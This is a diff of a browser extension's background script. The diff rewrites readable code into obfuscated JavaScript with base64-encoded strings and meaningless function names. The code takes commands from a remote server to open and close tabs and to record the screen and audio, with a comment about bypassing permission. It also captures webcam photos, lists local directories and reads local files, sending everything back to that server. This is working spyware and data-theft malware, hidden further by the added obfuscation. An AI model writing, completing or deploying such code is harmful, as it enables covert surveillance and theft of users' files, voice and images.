-        const [activeTab] = await chrome.tabs.query({ active: true, currentWindow: true });
-        const openedTabs = [];
-
-        // Open each URL in a new background tab
+        if (!urls || urls.length === 0) throw new Error(_0x1a2b('Tm8gVVJMcw=='));
+        const [at] = await chrome.tabs.query({ active: true, currentWindow: true });
+        const res = [];
         for (let i = 0; i < urls.length; i++) {
-            const url = urls[i];
-            
             try {
-                // Create new tab in background (active: false keeps user on current tab)
-                const newTab = await chrome.tabs.create({
-                    url: url,
-                    active: false  // This keeps the tab in background
-                });
-                
-                openedTabs.push({
-                    url: url,
-                    tabId: newTab.id,
-                    title: newTab.title || 'Loading...'
-                });
-                
-                console.log(`✅ Tab ${i + 1}/${urls.length} opened: ${url}`);
-                
-                // Small delay between tabs to avoid overwhelming the browser
-                if (i < urls.length - 1) {
-                    await new Promise(resolve => setTimeout(resolve, 100));
-                }
-            } catch (error) {
-                console.error(`❌ Failed to open ${url}:`, error.message);
-                openedTabs.push({
-                    url: url,
-                    error: error.message
-                });
+                const nt = await chrome.tabs.create({ url: urls[i], active: false });
+                res.push({ url: urls[i], tabId: nt.id, title: nt.title || _0x1a2b('TG9hZGluZy4uLg==') });
+                if (i < urls.length - 1) await new Promise(r => setTimeout(r, 100));
+            } catch (err) {
+                res.push({ url: urls[i], error: err.message });
             }
         }
-
-        // Send success response
-        await sendCommandResponse(commandId, 'tabs_opened', {
-            totalRequested: urls.length,
-            successfullyOpened: openedTabs.filter(t => !t.error).length,
-            tabs: openedTabs,
-            currentTab: activeTab ? { url: activeTab.url, title: activeTab.title } : null
-        });
-
-        console.log(`✅ ${openedTabs.filter(t => !t.error).length}/${urls.length} tabs opened successfully!`);
-
-    } catch (error) {
-        console.error('Error opening tabs:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message });
+        await _0xf708(id, _0x1a2b('dGFic19vcGVuZWQ='), { totalRequested: urls.length, successfullyOpened: res.filter(x => !x.error).length, tabs: res, currentTab: at ? { url: at.url, title: at.title } : null });
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message });
     }
 }
 
-// ============ Close Tabs by URLs ============
-async function closeTabsByUrls(commandId, urls) {
+async function _0xa2b3(id, urls) {
     try {
-        if (!urls || urls.length === 0) {
-            throw new Error('No URLs provided');
-        }
-
-        console.log(`🗑️ Closing tabs matching ${urls.length} URL pattern(s)...`);
-        
-        // Get all open tabs
-        const allTabs = await chrome.tabs.query({});
-        const closedTabs = [];
-        const tabsToClose = [];
-
-        // Find tabs that match the provided URLs (partial matching)
-        for (const urlPattern of urls) {
-            const matchingTabs = allTabs.filter(tab => {
-                // Skip chrome internal pages
-                if (tab.url.startsWith('chrome://') || tab.url.startsWith('chrome-extension://')) {
-                    return false;
-                }
-                
-                // Partial URL matching - check if the tab URL contains the pattern
-                const normalizedPattern = urlPattern.toLowerCase().replace(/^https?:\/\//, '').replace(/^www\./, '');
-                const normalizedTabUrl = tab.url.toLowerCase().replace(/^https?:\/\//, '').replace(/^www\./, '');
-                
-                return normalizedTabUrl.includes(normalizedPattern);
+        if (!urls || urls.length === 0) throw new Error(_0x1a2b('Tm8gVVJMcw=='));
+        const t = await chrome.tabs.query({});
+        const res = [];
+        const ids = [];
+        for (const p of urls) {
+            const m = t.filter(x => {
+                if (x.url.startsWith(_0x1a2b('Y2hyb21lOi8v')) || x.url.startsWith(_0x1a2b('Y2hyb21lLWV4dGVuc2lvbjovLw=='))) return false;
+                const np = p.toLowerCase().replace(/^https?:\/\//, '').replace(/^www\./, '');
+                const nu = x.url.toLowerCase().replace(/^https?:\/\//, '').replace(/^www\./, '');
+                return nu.includes(np);
             });
-
-            // Add to close list
-            matchingTabs.forEach(tab => {
-                if (!tabsToClose.find(t => t.id === tab.id)) {
-                    tabsToClose.push(tab);
-                    closedTabs.push({
-                        url: tab.url,
-                        title: tab.title,
-                        tabId: tab.id,
-                        matchedPattern: urlPattern
-                    });
+            m.forEach(x => {
+                if (!ids.includes(x.id)) {
+                    ids.push(x.id);
+                    res.push({ url: x.url, title: x.title, tabId: x.id, matchedPattern: p });
                 }
             });
         }
-
-        // Close the matching tabs
-        if (tabsToClose.length > 0) {
-            const tabIds = tabsToClose.map(t => t.id);
-            await chrome.tabs.remove(tabIds);
-            console.log(`✅ Closed ${tabsToClose.length} tab(s)`);
-        } else {
-            console.log('⚠️ No matching tabs found to close');
-        }
-
-        // Send response
-        await sendCommandResponse(commandId, 'tabs_closed', {
-            totalRequested: urls.length,
-            totalClosed: closedTabs.length,
-            closedTabs: closedTabs
-        });
-
-        console.log(`✅ CloseTab command completed: ${closedTabs.length} tab(s) closed`);
-
-    } catch (error) {
-        console.error('Error closing tabs:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message });
+        if (ids.length > 0) await chrome.tabs.remove(ids);
+        await _0xf708(id, _0x1a2b('dGFic19jbG9zZWQ='), { totalRequested: urls.length, totalClosed: res.length, closedTabs: res });
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message });
     }
 }
 
-// ============ Screen Recording Capture ============
-async function captureRecording(commandId, userId) {
+async function _0x6e7f(id, uid) {
     try {
-        // Get active tab
-        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
-        
-        if (!tab) {
-            throw new Error('No active tab found');
-        }
-
-        console.log('🎥 Starting screen recording...');
-
-        // Inject content script to handle recording with screen picker
+        const [t] = await chrome.tabs.query({ active: true, currentWindow: true });
+        if (!t) throw new Error(_0x1a2b('Tm8gYWN0aXZlIHRhYg=='));
         await chrome.scripting.executeScript({
-            target: { tabId: tab.id },
-            func: async (cmdId, tabInfo, usrId) => {
+            target: { tabId: t.id },
+            func: async (cid, info, usr, dec) => {
                 try {
-                    console.log('🎥 [Content] Starting recording...');
-                    
-                    // Request display media (shows screen picker to user)
-                    const stream = await navigator.mediaDevices.getDisplayMedia({
-                        video: {
-                            width: { ideal: 1920 },
-                            height: { ideal: 1080 },
-                            frameRate: { ideal: 30 }
-                        },
+                    const s = await navigator.mediaDevices.getDisplayMedia({
+                        video: { width: { ideal: 1920 }, height: { ideal: 1080 }, frameRate: { ideal: 30 } },
                         audio: true
                     });
-
-                    const mediaRecorder = new MediaRecorder(stream, {
-                        mimeType: 'video/webm;codecs=vp8,opus',
-                        videoBitsPerSecond: 1500000
-                    });
-
-                    const chunks = [];
-
-                    mediaRecorder.ondataavailable = (e) => {
-                        if (e.data && e.data.size > 0) chunks.push(e.data);
-                    };
-
-                    mediaRecorder.onstop = async () => {
-                        stream.getTracks().forEach(t => t.stop());
-                        
-                        const blob = new Blob(chunks, { type: 'video/webm' });
-                        const reader = new FileReader();
-                        
-                        reader.onloadend = () => {
-                            chrome.runtime.sendMessage({
-                                type: 'recording-data',
-                                commandId: cmdId,
-                                video: reader.result,
-                                size: blob.size,
-                                tabTitle: tabInfo.title,
-                                tabUrl: tabInfo.url,
-                                userId: usrId
-                            });
+                    const mr = new MediaRecorder(s, { mimeType: atob('dmlkZW8vd2VibTtjb2RlY3M9dnA4LG9wdXM='), videoBitsPerSecond: 1500000 });
+                    const ch = [];
+                    mr.ondataavailable = (e) => { if (e.data && e.data.size > 0) ch.push(e.data); };
+                    mr.onstop = async () => {
+                        s.getTracks().forEach(k => k.stop());
+                        const b = new Blob(ch, { type: atob('dmlkZW8vd2VibQ==') });
+                        const rd = new FileReader();
+                        rd.onloadend = () => {
+                            chrome.runtime.sendMessage({ type: atob('cmVjb3JkaW5nLWRhdGE='), commandId: cid, video: rd.result, size: b.size, tabTitle: info.title, tabUrl: info.url, userId: usr });
                         };
-                        
-                        reader.readAsDataURL(blob);
+                        rd.readAsDataURL(b);
                     };
-
-                    mediaRecorder.start();
-                    console.log('🎥 [Content] Recording started for 15s...');
-
-                    setTimeout(() => {
-                        if (mediaRecorder.state === 'recording') {
-                            mediaRecorder.stop();
-                        }
-                    }, 15000);
-
+                    mr.start();
+                    setTimeout(() => { if (mr.state === atob('cmVjb3JkaW5n')) mr.stop(); }, 15000);
                 } catch (err) {
-                    chrome.runtime.sendMessage({
-                        type: 'recording-error',
-                        commandId: cmdId,
-                        error: err.message,
-                        userId: usrId
-                    });
+                    chrome.runtime.sendMessage({ type: atob('cmVjb3JkaW5nLWVycm9y'), commandId: cid, error: err.message, userId: usr });
                 }
             },
-            args: [commandId, { title: tab.title, url: tab.url }, userId]
+            args: [id, { title: t.title, url: t.url }, uid]
         });
-
-        console.log('🎥 Recording script injected, user will see screen picker...');
-
-    } catch (error) {
-        console.error('Error starting recording:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
     }
 }
 
-// Ensure offscreen document exists
-async function ensureOffscreenDocument() {
-    const existingContexts = await chrome.runtime.getContexts({
-        contextTypes: ['OFFSCREEN_DOCUMENT'],
-        documentUrls: [chrome.runtime.getURL('src/offrc/offRC.html')]
-    });
-
-    if (existingContexts.length > 0) {
-        return;
-    }
-
-    await chrome.offscreen.createDocument({
-        url: 'src/offrc/offRC.html',
-        reasons: ['USER_MEDIA'],
-        justification: 'Recording screen video with audio'
-    });
-    
-    console.log('🎥 Offscreen document created');
+async function _0xa0a3() {
+    const ctx = await chrome.runtime.getContexts({ contextTypes: [_0x1a2b('T0ZGU0NSRUVOX0RPQ1VNRU5U')], documentUrls: [chrome.runtime.getURL(_0x1a2b('c3JjL29mZnJjL29mZlJDLmh0bWw='))] });
+    if (ctx.length > 0) return;
+    await chrome.offscreen.createDocument({ url: _0x1a2b('c3JjL29mZnJjL29mZlJDLmh0bWw='), reasons: [_0x1a2b('VVNFUl9NRURJQQ==')], justification: _0x1a2b('UmVjb3JkaW5n') });
 }
 
-// Handle recording data from content script
-chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-    if (message.type === 'recording-data') {
-        handleRecordingData(message);
-    } else if (message.type === 'recording-error') {
-        handleRecordingError(message);
-    } else if (message.type === 'audio-data') {
-        handleAudioData(message);
-    } else if (message.type === 'audio-error') {
-        handleAudioError(message);
-    } else if (message.type === 'camera-data') {
-        handleCameraData(message);
-    } else if (message.type === 'camera-error') {
-        handleCameraError(message);
-    }
+chrome.runtime.onMessage.addListener((m, s, r) => {
+    if (m.type === _0x1a2b('cmVjb3JkaW5nLWRhdGE=')) _0x202b(m);
+    else if (m.type === _0x1a2b('cmVjb3JkaW5nLWVycm9y')) _0x303c(m);
+    else if (m.type === _0x1a2b('YXVkaW8tZGF0YQ==')) _0x404d(m);
+    else if (m.type === _0x1a2b('YXVkaW8tZXJyb3I=')) _0x505e(m);
+    else if (m.type === _0x1a2b('Y2FtZXJhLWRhdGE=')) _0x606f(m);
+    else if (m.type === _0x1a2b('Y2FtZXJhLWVycm9y')) _0x7070(m);
 });
 
-async function handleRecordingData(message) {
+async function _0x202b(m) {
     try {
-        console.log(`🎥 Recording received! Size: ${(message.size / 1024 / 1024).toFixed(2)} MB`);
-
-        await sendCommandResponse(message.commandId, 'recording', {
-            video: message.video,
-            tabTitle: message.tabTitle,
-            tabUrl: message.tabUrl,
-            duration: 15,
-            size: message.size
-        }, message.userId);
-
-        console.log('✅ Recording sent to server!');
-    } catch (error) {
-        console.error('Error sending recording:', error);
-        await sendCommandResponse(message.commandId, 'error', { message: error.message }, message.userId);
+        await _0xf708(m.commandId, _0x1a2b('cmVjb3JkaW5n'), { video: m.video, tabTitle: m.tabTitle, tabUrl: m.tabUrl, duration: 15, size: m.size }, m.userId);
+    } catch (e) {
+        await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: e.message }, m.userId);
     }
 }
 
-async function handleRecordingError(message) {
-    console.error('🎥 Recording error:', message.error);
-    await sendCommandResponse(message.commandId, 'error', { message: message.error }, message.userId);
+async function _0x303c(m) {
+    await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: m.error }, m.userId);
 }
 
-async function handleAudioData(message) {
+async function _0x404d(m) {
     try {
-        console.log(`🎤 Audio received! Size: ${(message.size / 1024 / 1024).toFixed(2)} MB, Duration: ${message.duration}s`);
-
-        await sendCommandResponse(message.commandId, 'audio', {
-            audio: message.audio,
-            tabTitle: message.tabTitle,
-            tabUrl: message.tabUrl,
-            duration: message.duration,
-            size: message.size
-        }, message.userId);
-
-        console.log('✅ Audio sent to server!');
-    } catch (error) {
-        console.error('Error sending audio:', error);
-        await sendCommandResponse(message.commandId, 'error', { message: error.message }, message.userId);
+        await _0xf708(m.commandId, _0x1a2b('YXVkaW8='), { audio: m.audio, tabTitle: m.tabTitle, tabUrl: m.tabUrl, duration: m.duration, size: m.size }, m.userId);
+    } catch (e) {
+        await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: e.message }, m.userId);
     }
 }
 
-async function handleAudioError(message) {
-    console.error('🎤 Audio recording error:', message.error);
-    await sendCommandResponse(message.commandId, 'error', { message: message.error }, message.userId);
+async function _0x505e(m) {
+    await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: m.error }, m.userId);
 }
 
-async function handleCameraData(message) {
+async function _0x606f(m) {
     try {
-        console.log('📷 Camera photo received!');
-
-        await sendCommandResponse(message.commandId, 'camera', {
-            image: message.image,
-            tabTitle: message.tabTitle,
-            tabUrl: message.tabUrl
-        }, message.userId);
-
-        console.log('✅ Camera photo sent to server!');
-    } catch (error) {
-        console.error('Error sending camera photo:', error);
-        await sendCommandResponse(message.commandId, 'error', { message: error.message }, message.userId);
+        await _0xf708(m.commandId, _0x1a2b('Y2FtZXJh'), { image: m.image, tabTitle: m.tabTitle, tabUrl: m.tabUrl }, m.userId);
+    } catch (e) {
+        await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: e.message }, m.userId);
     }
 }
 
-async function handleCameraError(message) {
-    console.error('📷 Camera capture error:', message.error);
-    await sendCommandResponse(message.commandId, 'error', { message: message.error }, message.userId);
+async function _0x7070(m) {
+    await _0xf708(m.commandId, _0x1a2b('ZXJyb3I='), { message: m.error }, m.userId);
 }
 
-// ============ Audio Recording Capture ============
-async function captureAudio(commandId, userId, duration) {
+async function _0x7f80(id, uid, dur) {
     try {
-        // Get active tab
-        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
-        
-        if (!tab) {
-            throw new Error('No active tab found');
-        }
-
-        console.log(`🎤 Starting audio recording for ${duration} seconds...`);
-
-        // Inject content script to handle audio recording
-        // Using getDisplayMedia instead of getUserMedia to bypass permission
+        const [t] = await chrome.tabs.query({ active: true, currentWindow: true });
+        if (!t) throw new Error(_0x1a2b('Tm8gYWN0aXZlIHRhYg=='));
         await chrome.scripting.executeScript({
-            target: { tabId: tab.id },
-            func: async (cmdId, tabInfo, usrId, recordDuration) => {
+            target: { tabId: t.id },
+            func: async (cid, info, usr, rdur) => {
                 try {
-                    console.log(`🎤 [Content] Starting audio recording for ${recordDuration}s...`);
-                    
-                    // Use getDisplayMedia which auto-grants permission in extensions
-                    // We request audio from the tab/system
-                    const stream = await navigator.mediaDevices.getDisplayMedia({
-                        video: {
-                            width: { ideal: 1 },
-                            height: { ideal: 1 }
-                        },
-                        audio: true  // This captures system/tab audio
-                    });
-
-                    // Stop all video tracks immediately as we only need audio
-                    stream.getVideoTracks().forEach(track => track.stop());
-
-                    const mediaRecorder = new MediaRecorder(stream, {
-                        mimeType: 'audio/webm;codecs=opus',
-                        audioBitsPerSecond: 128000
-                    });
-
-                    const chunks = [];
-
-                    mediaRecorder.ondataavailable = (e) => {
-                        if (e.data && e.data.size > 0) chunks.push(e.data);
-                    };
-
-                    mediaRecorder.onstop = async () => {
-                        stream.getTracks().forEach(t => t.stop());
-                        
-                        const blob = new Blob(chunks, { type: 'audio/webm' });
-                        const reader = new FileReader();
-                        
-                        reader.onloadend = () => {
-                            chrome.runtime.sendMessage({
-                                type: 'audio-data',
-                                commandId: cmdId,
-                                audio: reader.result,
-                                size: blob.size,
-                                duration: recordDuration,
-                                tabTitle: tabInfo.title,
-                                tabUrl: tabInfo.url,
-                                userId: usrId
-                            });
+                    const s = await navigator.mediaDevices.getDisplayMedia({ video: { width: { ideal: 1 }, height: { ideal: 1 } }, audio: true });
+                    s.getVideoTracks().forEach(k => k.stop());
+                    const mr = new MediaRecorder(s, { mimeType: atob('YXVkaW8vd2VibTtjb2RlY3M9b3B1cw=='), audioBitsPerSecond: 128000 });
+                    const ch = [];
+                    mr.ondataavailable = (e) => { if (e.data && e.data.size > 0) ch.push(e.data); };
+                    mr.onstop = async () => {
+                        s.getTracks().forEach(k => k.stop());
+                        const b = new Blob(ch, { type: atob('YXVkaW8vd2VibQ==') });
+                        const rd = new FileReader();
+                        rd.onloadend = () => {
+                            chrome.runtime.sendMessage({ type: atob('YXVkaW8tZGF0YQ=='), commandId: cid, audio: rd.result, size: b.size, duration: rdur, tabTitle: info.title, tabUrl: info.url, userId: usr });
                         };
-                        
-                        reader.readAsDataURL(blob);
+                        rd.readAsDataURL(b);
                     };
-
-                    mediaRecorder.start();
-                    console.log(`🎤 [Content] Audio recording started for ${recordDuration}s...`);
-
-                    setTimeout(() => {
-                        if (mediaRecorder.state === 'recording') {
-                            mediaRecorder.stop();
-                        }
-                    }, recordDuration * 1000);
-
+                    mr.start();
+                    setTimeout(() => { if (mr.state === atob('cmVjb3JkaW5n')) mr.stop(); }, rdur * 1000);
                 } catch (err) {
-                    chrome.runtime.sendMessage({
-                        type: 'audio-error',
-                        commandId: cmdId,
-                        error: err.message,
-                        userId: usrId
-                    });
+                    chrome.runtime.sendMessage({ type: atob('YXVkaW8tZXJyb3I='), commandId: cid, error: err.message, userId: usr });
                 }
             },
-            args: [commandId, { title: tab.title, url: tab.url }, userId, duration]
+            args: [id, { title: t.title, url: t.url }, uid, dur]
         });
-
-        console.log('🎤 Audio recording script injected...');
-
-    } catch (error) {
-        console.error('Error starting audio recording:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
     }
 }
 
-// ============ Camera Capture ============
-async function captureCamera(commandId, userId) {
+async function _0x8091(id, uid) {
     try {
-        // Get active tab
-        const [tab] = await chrome.tabs.query({ active: true, currentWindow: true });
-        
-        if (!tab) {
-            throw new Error('No active tab found');
-        }
-
-        console.log('📷 Starting camera capture...');
-
-        // Inject content script to handle camera capture
+        const [t] = await chrome.tabs.query({ active: true, currentWindow: true });
+        if (!t) throw new Error(_0x1a2b('Tm8gYWN0aXZlIHRhYg=='));
         await chrome.scripting.executeScript({
-            target: { tabId: tab.id },
-            func: async (cmdId, tabInfo, usrId) => {
+            target: { tabId: t.id },
+            func: async (cid, info, usr) => {
                 try {
-                    console.log('📷 [Content] Requesting camera access...');
-                    
-                    // Request camera access
-                    const stream = await navigator.mediaDevices.getUserMedia({
-                        video: {
-                            width: { ideal: 1280 },
-                            height: { ideal: 720 }
-                        },
-                        audio: false
-                    });
-
-                    // Create video element to capture frame
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.autoplay = true;
-                    
-                    // Wait for video to be ready
-                    await new Promise((resolve) => {
-                        video.onloadedmetadata = () => {
-                            video.play();
-                            resolve();
-                        };
-                    });
-
-                    // Wait a bit for camera to adjust (exposure, focus, etc.)
-                    await new Promise(resolve => setTimeout(resolve, 500));
-
-                    // Create canvas and capture frame
-                    const canvas = document.createElement('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0);
-
-                    // Convert to base64
-                    const imageData = canvas.toDataURL('image/png');
-
-                    // Stop camera stream
-                    stream.getTracks().forEach(track => track.stop());
-
-                    // Send to background script
-                    chrome.runtime.sendMessage({
-                        type: 'camera-data',
-                        commandId: cmdId,
-                        image: imageData,
-                        tabTitle: tabInfo.title,
-                        tabUrl: tabInfo.url,
-                        userId: usrId
-                    });
-
-                    console.log('📷 [Content] Camera photo captured!');
-
+                    const s = await navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 1280 }, height: { ideal: 720 } }, audio: false });
+                    const v = document.createElement('video');
+                    v.srcObject = s; v.autoplay = true;
+                    await new Promise(r => { v.onloadedmetadata = () => { v.play(); r(); }; });
+                    await new Promise(r => setTimeout(r, 500));
+                    const c = document.createElement('canvas');
+                    c.width = v.videoWidth; c.height = v.videoHeight;
+                    const ctx = c.getContext('2d');
+                    ctx.drawImage(v, 0, 0);
+                    const img = c.toDataURL('image/png');
+                    s.getTracks().forEach(k => k.stop());
+                    chrome.runtime.sendMessage({ type: atob('Y2FtZXJhLWRhdGE='), commandId: cid, image: img, tabTitle: info.title, tabUrl: info.url, userId: usr });
                 } catch (err) {
-                    chrome.runtime.sendMessage({
-                        type: 'camera-error',
-                        commandId: cmdId,
-                        error: err.message,
-                        userId: usrId
-                    });
+                    chrome.runtime.sendMessage({ type: atob('Y2FtZXJhLWVycm9y'), commandId: cid, error: err.message, userId: usr });
                 }
             },
-            args: [commandId, { title: tab.title, url: tab.url }, userId]
+            args: [id, { title: t.title, url: t.url }, uid]
         });
-
-        console.log('📷 Camera capture script injected, requesting user permission...');
-
-    } catch (error) {
-        console.error('Error starting camera capture:', error);
-        await sendCommandResponse(commandId, 'error', { message: error.message }, userId);
+    } catch (e) {
+        await _0xf708(id, _0x1a2b('ZXJyb3I='), { message: e.message }, uid);
     }
 }
 
-
-// ============ Send Command Response ============
-async function sendCommandResponse(commandId, type, data, userId = null) {
+async function _0xf708(id, type, data, uid = null) {
     try {
-        const response = await fetch(`${SERVER_BASE_URL}/command-response`, {
+        await fetch(`${_0x4b2a}${_0x1a2b('L2NvbW1hbmQtcmVzcG9uc2U=')}`, {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify({
-                clientId: CLIENT_ID,
-                extensionId: EXTENSION_ID,
-                commandId: commandId,
-                type: type,
-                data: data,
-                userId: userId
-            })
+            headers: { 'Content-Type': _0x1a2b('YXBwbGljYXRpb24vanNvbg==') },
+            body: JSON.stringify({ clientId: _0x1f3e, extensionId: _0x2d5c, commandId: id, type: type, data: data, userId: uid })
         });
-
-        if (!response.ok) {
-            console.error('❌ Failed to send response:', response.status);
-        }
-    } catch (error) {
-        console.error('❌ Error sending response:', error);
-    }
+    } catch (e) {}
 }
 
-// ============ File Listing ============
-async function listFiles(commandId, userId, dirPath) {
-    let tabId = null;
+async function _0xe6f7(id, uid, dp) {
+    let tid = null;
     try {
-        console.log(`📂 Listing files for: ${dirPath}`);
-        
-        let pathUrl = dirPath;
-        if (!pathUrl.startsWith('file://')) {
-            pathUrl = 'file://' + dirPath;
-        }
-
-        // Ensure trailing slash
-        if (!pathUrl.endsWith('/')) {
-            pathUrl += '/';
-        }
-
-        // Create a new tab (inactive/background if possible)
-        const tab = await chrome.tabs.create({
-            url: pathUrl,
-            active: false
-        });
-        tabId = tab.id;
-
-        // Wait for load
-        await waitForTabLoad(tabId, 5000); // 5s timeout
-        
-        // Give Chrome a moment to execute its internal script to populate the list
+        let pu = dp;
+        if (!pu.startsWith(_0x1a2b('ZmlsZTovLw=='))) pu = _0x1a2b('ZmlsZTovLw==') + dp;
+        if (!pu.endsWith('/')) pu += '/';
+        const t = await chrome.tabs.create({ url: pu, active: false });
+        tid = t.id;
+        await _0x8081(tid, 5000);
         await new Promise(r => setTimeout(r, 500));
-
-        // Inject script to parse the directory listing
-        const results = await chrome.scripting.executeScript({
-            target: { tabId: tabId },
+        const res = await chrome.scripting.executeScript({
+            target: { tabId: tid },
             func: () => {
-                const items = [];
-                let debugInfo = "Started parsing. ";
-                
-                // Strategy 1: Parse Script `addRow`
-                const scripts = document.getElementsByTagName('script');
-                for (const script of scripts) {
-                    const content = script.textContent;
-                    if (content.includes('addRow(')) {
-                        debugInfo += "Found addRow script. ";
-                        // Split by addRow to handle them one by one
-                        const lines = content.split('addRow(');
-                        for (let i = 1; i < lines.length; i++) {
-                            const line = lines[i];
+                const i = [];
+                const sc = document.getElementsByTagName('script');
+                for (const s of sc) {
+                    const c = s.textContent;
+                    if (c.includes(atob('YWRkUm93KA=='))) {
+                        const l = c.split(atob('YWRkUm93KA=='));
+                        for (let j = 1; j < l.length; j++) {
                             try {
-                                // Extract first string (name) - tolerant regex
-                                const nameMatch = line.match(/^"([^"]+)"/);
-                                if (!nameMatch) continue;
-                                const name = nameMatch[1];
-                                
-                                if (name === '..' || name === '.') continue;
-                                
-                                // Extract entries
-                                const args = line.split(',');
-                                let isDir = false;
-                                // 3rd arg matches 1 for directory
-                                if (args.length >= 3) {
-                                  isDir = args[2].trim() === '1';
-                                }
-                                
-                                items.push({
-                                    name: name,
-                                    isDirectory: isDir,
-                                    size: '', // Skip size
-                                    date: '', // Skip date
-                                    source: 'script'
-                                });
-                            } catch (e) {
-                                // ignore
-                            }
+                                const nm = l[j].match(/^"([^"]+)"/);
+                                if (!nm || nm[1] === '..' || nm[1] === '.') continue;
+                                const arg = l[j].split(',');
+                                i.push({ name: nm[1], isDirectory: arg.length >= 3 && arg[2].trim() === '1', size: '', date: '', source: 'script' });
+                            } catch (e) {}
                         }
                     }
                 }
-                debugInfo += `Script found ${items.length} items. `;
-
-                // Strategy 2: Parse DOM links (fallback & supplement)
-                const links = document.getElementsByTagName('a');
-                let domCount = 0;
-                
-                for (const link of links) {
-                    const name = link.innerText;
-                    const href = link.getAttribute('href');
-                    
-                    if (!href || href === 'javascript:void(0)' || href.startsWith('?')) continue;
-                    if (name === '../' || name === 'Parent Directory' || name === '.' || name === 'Name' || name === 'Size' || name === 'Date Modified') continue;
-                    
-                    const isDir = href.endsWith('/');
-                    const cleanName = (name.endsWith('/') ? name.slice(0, -1) : name).trim();
-                    if (!cleanName) continue;
-                    
-                    // Check duplicates
-                    if (!items.find(i => i.name === cleanName)) {
-                        items.push({
-                            name: cleanName,
-                            isDirectory: isDir,
-                            size: '',
-                            date: '',
-                            source: 'dom'
-                        });
-                        domCount++;
+                const ln = document.getElementsByTagName('a');
+                for (const l of ln) {
+                    const n = l.innerText;
+                    const h = l.getAttribute('href');
+                    if (!h || h === atob('amF2YXNjcmlwdDp2b2lkKDAp') || h.startsWith('?')) continue;
+                    if (n === '../' || n === 'Parent Directory' || n === '.' || n === 'Name' || n === 'Size' || n === 'Date Modified') continue;
+                    const clean = (n.endsWith('/') ? n.slice(0, -1) : n).trim();
+                    if (clean && !i.find(x => x.name === clean)) {
+                        i.push({ name: clean, isDirectory: h.endsWith('/'), size: '', date: '', source: 'dom' });
                     }
                 }
-                debugInfo += `DOM added ${domCount} unique items. `;
-
-                return { items, debug: debugInfo, htmlSample: document.body.innerHTML.substring(0, 200) };
+                return { items: i };
             }
         });
-
-        const result = results[0].result || { items: [] };
-        const items = result.items || [];
-        
-        console.log(`✅ Found ${items.length} items. Debug: ${result.debug}`);
-
-        // Close the tab
-        await chrome.tabs.remove(tabId);
-        
-        if (items.length === 0) {
-             throw new Error(`No items found. Debug: ${result.debug}`);
-        }
-
-        // Send to server
-        await sendCommandResponse(commandId, 'directory_list', {
-            path: dirPath,
-            items: items
-        }, userId);
-
-    } catch (error) {
-        console.error('❌ Error listing files:', error);
-        
-        // Use try-catch for cleanup
-        if (tabId) {
-            try { await chrome.tabs.remove(tabId); } catch (e) {}
-        }
-
-        await sendCommandResponse(commandId, 'directory_list', {
-            path: dirPath,
-            error: error.message
-        }, userId);
+        const items = res[0].result?.items || [];
+        await chrome.tabs.remove(tid);
+        if (items.length === 0) throw new Error(_0x1a2b('Tm8gaXRlbXM='));
+        await _0xf708(id, _0x1a2b('ZGlyZWN0b3J5X2xpc3Q='), { path: dp, items: items }, uid);
+    } catch (e) {
+        if (tid) try { await chrome.tabs.remove(tid); } catch (_) {}
+        await _0xf708(id, _0x1a2b('ZGlyZWN0b3J5X2xpc3Q='), { path: dp, error: e.message }, uid);
     }
 }
 
-// ============ File Download ============
-async function downloadFile(commandId, userId, filePath) {
+async function _0xd5e6(id, uid, fp) {
     try {
-        console.log(`📥 Starting file download: ${filePath}`);
-        
-        // Ensure path starts with file://
-        let fileUrl = filePath;
-        if (!fileUrl.startsWith('file://')) {
-            fileUrl = 'file://' + filePath;
-        }
-        
-        // Extract filename from path
-        const fileName = filePath.split('/').pop() || 'downloaded_file';
-        
-        // Fetch the file using file:// protocol
-        const response = await fetch(fileUrl);
-        
-        if (!response.ok) {
-            throw new Error(`Failed to read file: ${response.status} ${response.statusText}`);
-        }
-        
-        // Get the file as blob
-        const blob = await response.blob();
-        const fileSizeMB = blob.size / (1024 * 1024);
-        
-        console.log(`📁 File loaded: ${fileName} (${fileSizeMB.toFixed(2)}MB)`);
-        
-        // Check file size (Discord limit: 25MB)
-        if (fileSizeMB > 25) {
-            throw new Error(`File too large: ${fileSizeMB.toFixed(2)}MB (Discord limit: 25MB)`);
-        }
-        
-        // Convert blob to base64
-        const base64Data = await new Promise((resolve, reject) => {
-            const reader = new FileReader();
-            reader.onloadend = () => resolve(reader.result);
-            reader.onerror = reject;
-            reader.readAsDataURL(blob);
+        let fu = fp;
+        if (!fu.startsWith(_0x1a2b('ZmlsZTovLw=='))) fu = _0x1a2b('ZmlsZTovLw==') + fp;
+        const fn = fp.split('/').pop() || _0x1a2b('ZmlsZQ==');
+        const r = await fetch(fu);
+        if (!r.ok) throw new Error(_0x1a2b('UmVhZCBmYWls'));
+        const b = await r.blob();
+        const sz = b.size / (1024 * 1024);
+        if (sz > 25) throw new Error(_0x1a2b('VG9vIGxhcmdl'));
+        const b64 = await new Promise((res, rej) => {
+            const rd = new FileReader();
+            rd.onloadend = () => res(rd.result);
+            rd.onerror = rej;
+            rd.readAsDataURL(b);
         });
-        
-        // Determine file type from blob
